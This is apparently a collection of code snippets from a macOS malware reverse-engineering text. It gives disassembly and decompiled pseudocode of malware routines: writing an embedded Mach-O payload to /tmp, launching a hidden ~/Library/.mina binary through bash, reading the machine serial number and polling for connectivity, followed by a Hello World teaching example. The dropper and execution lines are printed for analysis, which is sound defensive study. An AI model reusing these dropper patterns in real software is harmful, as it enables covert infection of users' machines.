["```\nNSURL* url = [NSURL URLWithString:@\"http://www.google.com\"];\n```", "```\n1 lea  rdx, qword [http___www_google_com]      ; @\"http://www.google.com\"  \n2 mov  rsi, qword [0x100008028]                ; @selector(URLWithString:) \n3 mov  rdi, qword [objc_cls_ref_NSURL]         ; objc_cls_ref_NSURL \ncall qword [**objc_msgSend**]\n```", "```\n0x00000001000017De    lea        rsi, qword [_joiner]\n0x00000001000017e5    movabs     rdi, 0x20f74\n\n0x0000000100001824    mov        qword [rbp-0x90], rdi\n...\n0x000000010000182e    mov        qword [rbp-0x98], rsi \n...\n\n0x0000000100001909    mov        rax, qword [objc_cls_ref_NSData] 1\n0x0000000100001910    mov        rsi, qword [0x1001a9428] ; @selector(dataWithBytes:length:)\n0x0000000100001917    mov        rdi, rax 2  \n0x000000010000191a    mov        rdx, qword [rbp-0x98] 3\n0x0000000100001921    mov        rcx, qword [rbp-0x90] \n0x0000000100001928    call       objc_msgSend \n0x000000010000192d    mov        qword [rbp-0x60], rax \n```", "```\nNSData* data = [NSData dataWithBytes:_joiner length:0x20f74]; \n```", "```\n0x00000001000017d2    lea       rcx, qword [cfstring__tmp_content]   ; @\"/tmp/content\"\n0x00000001000017d9    mov       edx, 0x1\n...\n0x0000000100001838    mov       dword [rbp-0x9c], edx\n...\n0x0000000100001848    mov       qword [rbp-0xb0], rcx \n\n0x0000000100001931    mov       rax, qword [rbp-0x60] ; ret value from dataWithBytes:length:. \n0x0000000100001935    mov       rsi, qword [0x1001a9430] ; @selector(writeToFile:atomically:) 1\n0x000000010000193c    mov       rdi, rax \n0x000000010000193f    mov       rdx, qword [rbp-0xb0]\n0x0000000100001946    mov       ecx, dword [rbp-0x9c] 2\n0x000000010000194c    call      objc_msgSend\n```", "```\n[data writeToFile:@\"/tmp/content\" atomically:1] \n```", "```\n_joiner:\n0x0000000100004120         **db**  0xcf ; '.' \n0x0000000100004121         **db**  0xfa ; '.'\n0x0000000100004122         **db**  0xed ; '.'\n0x0000000100004123         **db**  0xfe ; '.'\n0x0000000100004124         **db**  0x07 ; '.'\n0x0000000100004125         **db**  0x00 ; '.'\n0x0000000100004126        ** db**  0x00 ; '.'\n```", "```\n0x000000010001e1f1    mov        r15, rax\n0x000000010001e1f4    movabs     rdi, '/bin/bash' 1\n0x000000010001e1fe    movabs     rsi, 'h\\x00\\x00\\x00\\x00\\x00\\x00\\xe9'\n0x000000010001e208    call       imp___stubs__$sSS10FoundationE19_bridgeToObjectiveCSo8NSString\n                                 CyF ; (extension in Foundation):Swift.String._bridgeToObjectiv\n                                 eC() -> __C.NSString 2\n\n0x000000010001e20d    mov        rbx, rax\n0x000000010001e210    mov        rsi, qword [0x100045ba0] ; @selector(setLaunchPath:)\n0x000000010001e217    mov        rdi, r15\n0x000000010001e21a    mov        rdx, rax\n0x000000010001e21d    call       objc_msgSend 3\n```", "```\n0x000000010001e273    call       swift_allocObject 1\n0x000000010001e278    mov        rbx, rax\n...\n0x000000010001e286    mov        qword [rax+0x20], '-c' 2\n...\n0x000000010001e2a4    mov        r14, qword [rbp+var_80]  \n0x000000010001e2a8    mov        qword [rbx+0x38], r14\n...\n0x000000010001e2c0    mov        rsi, qword [_$sSSN_10003d0b8]  ; type metadata for Swift.\n                                                                  String ;\n0x000000010001e2c7    mov        rdi, rbx\n0x000000010001e2ca    call       imp___stubs__$sSa10FoundationE19_bridgeToObjectiveCSo7NSArrayC\n                                 yF ; (extension in Foundation):Swift.Array._bridgeToObjectiveC\n                                 () -> __C.NSArray 3\n0x000000010001e2cf    mov        r13, rax\n...\n0x000000010001e2da    mov        rsi, qword [0x100045ba8] ; @selector(setArguments:)\n0x000000010001e2e1    mov        rdi, r15 \n0x000000010001e2e4    mov        rdx, r13\n0x000000010001e2e7    call       objc_msgSend 4\n```", "```\n0x0000000100033f70    **db**        \" ~/Library/.mina > /dev/null 2>&1 && chmod +x\n~/Library/.mina > /dev/null 2>&1 && ~/Library/.mina > /dev/null 2>&1\", 0\n```", "```\n0x000000010001e300    mov        rdi, qword [rcx+rax]\n0x000000010001e304    mov        rsi, qword [0x100045bb0]   ; @selector(launch) 1\n0x000000010001e30b    call       objc_msgSend 2\n```", "```\n__Z15getDeviceSerialPc:          // getDeviceSerial(char*) \n\n0x0000000100004548    mov        r14, rdi 1\n\n0x0000000100004559    mov        rax, qword [_kIOMasterPortDefault]\n0x0000000100004560    mov        r15d, dword [rax] 2\n\n0x0000000100004563    lea        rdi, qword [IOPlatformExpertDevice] ;\"IOPlatformExpertDevice\"\n0x000000010000456a    call       IOServiceMatching 3\n\n0x000000010000456f    mov        edi, r15d \n0x0000000100004572    mov        rsi, rax                   \n0x0000000100004575    call       IOServiceGetMatchingService 4\n\n0x000000010000457e    mov        r15d, eax\n0x0000000100004581    mov        rax, qword [_kCFAllocatorDefault]\n0x0000000100004588    mov        rdx, qword [rax] \n0x000000010000458b    lea        rsi, qword [IOPlatformSerialNumber] \n0x0000000100004592    xor        ecx, ecx                   \n0x0000000100004594    mov        edi, r15d                 \n0x0000000100004597    call       IORegistryEntryCreateCFProperty 5\n\n0x000000010000459c    mov        edx, 0x20\n0x00000001000045a1    mov        ecx, 0x8000100\n0x00000001000045a6    mov        rdi, rax                   \n0x00000001000045a9    mov        rsi, r14                  \n0x00000001000045ac    call       CFStringGetCString 6\n\nreturn\n```", "```\n0x0000000100005b15:\n0x0000000100005b15    call       connectedToInternet()\n0x0000000100005b1a    and        al, 0x1\n0x0000000100005b1c    mov        byte [rbp+var_19], al\n0x0000000100005b1f    test       byte [rbp+var_19], 0x1 \n1 0x0000000100005b23    jz         loc_100005b2e \n2 0x0000000100005b29    jmp        loc_100005b40 \n\n3 0x0000000100005b2e:\n0x0000000100005b2e    mov        edi, 0x3c\n0x0000000100005b33    call       sleep\n0x0000000100005b38    mov        [rbp+var_3C], eax\n4 0x0000000100005b3b    jmp        0x0000000100005b15\n\nloc_100005b40: \n...\n```", "```\nwhile(0x0 == connectedToInternet()) {\n    sleep(0x3c);\n}\n```", "```\nint getDeviceSerial(int * arg0) {\n    r14 = arg0;\n    ...\n    r15 = kIOMasterPortDefault;\n    rax = IOServiceMatching(\"IOPlatformExpertDevice\");\n    rax = IOServiceGetMatchingService(r15, rax);\n    if (rax != 0x0) {\n        rbx = CFStringGetCString(IORegistryEntryCreateCFProperty(rax, \n              @\"IOPlatformSerialNumber\", kCFAllocatorDefault, 0x0), r14, 0x20, \n              kCFStringEncodingUTF8) != 0x0 ? 0x1 : 0x0;\n        IOObjectRelease(rax);\n    }\n    rax = rbx;\n    return rax;\n}\n```", "```\nint connectedToInternet() \n{\n    if( (@class(NSData), &@selector(dataWithContentsOfURL:), (@class(NSURL), \n         &@selector(URLWithString:), @\"http://www.google.com\")) != 0x0) \n    {\n         var_1 = 0x1;\n    }\n    else {\n         var_1 = 0x0;\n    }\n    rax = var_1 & 0x1 & 0xff;\n    return rax;\n}\n```", "```\n#import <Foundation/Foundation.h>\n\n int main(int argc, const char * argv[]) {\n @autoreleasepool {\n        NSLog(@\"Hello, World!\");\n    }\n    return 0;\n}\n```", "```\n% **clang main.m -fmodules -o helloWorld** \n\n% **file helloWorld** \nhelloWorld: Mach-O 64-bit executable x86_64\n```", "```\nmain:\n0x0000000100003f20    push       rbp\n0x0000000100003f21    mov        rbp, rsp\n0x0000000100003f24    sub        rsp, 0x20\n0x0000000100003f28    mov        dword [rbp+var_4], 0x0\n0x0000000100003f2f    mov        dword [rbp+var_8], edi\n0x0000000100003f32    mov        qword [rbp+var_10], rsi\n0x0000000100003f36    call       objc_autoreleasePoolPush\n0x0000000100003f3b    lea        rcx, qword [cfstring_Hello__World] ; @\"Hello, World!\"\n0x0000000100003f42    mov        rdi, rcx ; argument \"format\" for method NSLog 1\n0x0000000100003f45    mov        qword [rbp+var_18], rax\n0x0000000100003f49    mov        al, 0x0\n0x0000000100003f4b    call       NSLog \n0x0000000100003f50    mov        rdi, qword [rbp+var_18] ; argument \"pool\" for method objc_\n                                                           autoreleasePoolPop\n0x0000000100003f54    call       objc_autoreleasePoolPop \n0x0000000100003f59    xor        eax, eax\n0x0000000100003f5b    add        rsp, 0x20\n0x0000000100003f5f    pop        rbp\n0x0000000100003f60    ret\n```", "```\nint _main(int arg0, int arg1) {\n    var_18 = objc_autoreleasePoolPush();\n    NSLog(@\"Hello, World!\");\n    objc_autoreleasePoolPop(var_18);\n    return 0x0;\n}\n```", "```\n#import <Foundation/Foundation.h>\n\n int main(int argc, const char * argv[]) {\n    @autoreleasepool {    \n        NSLog(@\"Hello, World!\");\n    }\n    return 0;\n}\n```"]